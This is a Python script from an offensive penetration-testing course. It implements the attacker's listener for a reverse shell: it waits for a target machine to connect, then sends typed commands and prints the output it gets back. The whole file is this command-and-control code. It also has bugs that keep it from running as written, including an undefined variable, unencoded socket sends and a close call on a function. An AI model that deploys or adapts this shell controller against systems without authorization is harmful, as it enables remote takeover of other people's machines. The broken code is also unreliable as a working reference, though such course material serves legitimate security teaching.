# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn https://jo.linkedin.com/in/python2


# Basic TCP Server 


import socket # For Building TCP Connection
import sys


def connect(port):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket object 's'

    
    s.bind(("0.0.0.0", port)) # define the kali IP and the listening port

    s.listen(1) # define the backlog size, since we are expecting a single connection from a single
                                                            # target we will listen to one connection

    print('[+] Listening for incoming TCP connection on port {}'.format(port))

    conn, addr = s.accept() # accept() function will return the connection object ID (conn) and will return the client(target) IP address and source
                                # port in a tuple format (IP,port)

    print ('[+] We got a connection from: {}'.format(addr))


    while True:
        #command = raw_input("$ ") # Get user input and store it in command variable
        command = input ("$ ") # Get user input and store it in command variable
        quit_command = 'terminate'

        #if 'terminate' in command: # If we got terminate command, inform the client and close the connect and break the loop
        if quit_command in command: # If we got terminate command, inform the client and close the connect and break the loop
            conn.send(quit_command_encoded)
            conn.close()
            break

        else:
            #conn.send(command) # Otherwise we will send the command to the target
            conn.send(command) # Otherwise we will send the command to the target
            print(conn.recv(1024)) # and print the result that we got back

def main ():
    port = int(sys.argv[1])
    connect(port)
    connect.close()
main()
